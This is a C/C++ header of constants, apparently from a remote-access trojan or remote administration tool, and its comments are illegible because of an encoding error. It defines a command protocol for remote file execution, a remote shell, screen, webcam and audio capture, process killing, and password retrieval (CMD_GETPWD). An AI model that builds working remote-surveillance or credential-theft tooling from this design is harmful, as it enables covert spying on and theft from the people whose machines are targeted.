//����궨��

#pragma once

//��������
#define WM_SHOWTASK (WM_USER + 101)  //�Զ���������Ϣ

//�������궨��

#define ID_RES_FILE       1001
#define ID_RES_SCREEN     1002
#define ID_RES_CMD        1003
#define ID_RES_SYSTEM     1004
#define ID_RES_CAMERA     1005
#define ID_RES_SEPARATE   0        //�ָ���
#define ID_RES_RECYCLE    1006
#define ID_RES_SEETING    1007
#define ID_RES_ABOUT      1008

//���Ի���״̬����Դ
#define ID_RES_COPYRIGHT   1009   //�������
#define ID_RES_LISTENPORT  1010   //�����˿�
#define ID_RES_ONLINE      1011   //��������

//�ļ�����״̬����Դ
#define ID_RES_FILE1       1012
#define ID_RES_FILE2       1013

//CMDShell����״̬����Դ
#define ID_RES_CMD1       1014
#define ID_RES_CMD2       1015

//ϵͳ����״̬����Դ
#define ID_RES_SYSTEM1     1016
#define ID_RES_SYSTEM2     1017

//Զ������㲥״̬����Դ
#define ID_RES_REMOTECMD1   1018
#define ID_RES_REMOTECMD2   1019

//���ݴ���Ļ�������С
#define CONTEXT_BUF_SIZE   (1024 * 4)

//�Զ�����������Ϣ
#define ID_MSG_ONLINE   WM_USER + 1   //����
#define ID_MSG_OFFLINE  WM_USER + 2  //����

//IP��ַ��������С
#define IPADDR_SIZE  32

//��Ļ����Ļ�������С
#define SCREEN_BUF_SIZE  4030

//�������仺������С
#define VIDEO_BUF_SIZE   4020

//�������仺������С
#define AUDIO_BUF_SIZE   4078

//�����崫�仺������С
#define CLIPBOARD_BUF_SIZE   4078

//������Ϣ����
#define MSG_CAPTION_ONLINE       _T("��������")
//������Ϣ����
#define MSG_CAPTION_OFFLINE      _T("��������")

#define FILE_ACTIVE_UPLOAD       _T("�ϴ�")
#define FILE_ACTIVE_DOWNLOAD     _T("����")

//---------------------------------------------------------------------------
//��Ϣ��ʾ������Դ
#define ID_TIMER_POP_WINDOW		1051   //��������
#define ID_TIMER_CLOSE_WINDOW	1052   //�رմ���
#define ID_TIMER_DISPLAY_DELAY	1053   //�ӳ�
//��Ϣ��ʾ���ڴ�С
#define WIN_WIDTH	181    //���
#define WIN_HEIGHT	116    //�߶�


#define ID_FILE_MANAGER     1001    //�ļ�����
#define ID_SCREEN_MANAGER   1002    //��Ļ�鿴
#define ID_CMDSHELL_MANAGER 1003    //CMDShell
#define ID_SYS_MANAGER      1004    //ϵͳ����
#define ID_VIDEO_MANAGER    1005    //����ͷ


//-------------------------------------------------------------------------
//ָ��궨��
#define CMD_SHAKEHAND        0x01       //������֤   
#define CMD_SYSINFO          0x02       //ϵͳ��Ϣ
#define CMD_DISKINFO         0x03       //������Ϣ
#define CMD_FILELIST         0x04       //�ļ��б�
#define CMD_DOWNLOAD         0x05       //�ļ�����
#define CMD_UPLOAD           0x06       //�ļ��ϴ�(����)
#define CMD_FILEUPLOAD       0x07       //�ļ������ϴ�
#define CMD_FILEEXEC         0x08       //�ļ�ִ��
#define CMD_REFRESH          0x09       //ˢ��
#define CMD_FOLDER_CREATE    0x10       //����Ŀ¼(�ļ���)
#define CMD_FILE_DEL         0x11       //�ļ����У�ɾ��
#define CMD_FILE_COPY        0x12       //�ļ��ĸ���
#define CMD_FILE_PASTE       0x13       //�ļ���ճ��
#define CMD_FILE_RENAME      0x14       //�ļ�(��)������
#define CMD_ATTRIBUTE        0x15       //����

#define CMD_TELNET           0x16       //����Զ���ն�
#define CMD_COMMOND          0x17       //��������

#define CMD_CHATMSG          0x18       //������Ϣ
#define CMD_PROGRESS         0x19       //���̹���
#define CMD_PROC_TASKKILL    0x20       //�رս���
#define CMD_SCREEN           0x21       //��Ļ�鿴
#define CMD_GETPWD           0x22       //��ȡϵͳ���ʺ�����
#define CMD_VIDEO_VIEW       0x23       //�����鿴
#define CMD_OPERATOR         0x24       //�ػ�/ע��/����
#define CMD_AUDIO            0x25       //��������
#define CMD_BROADCAST        0x26       //Զ������㲥
#define CMD_DESKTOP          0x27       //�������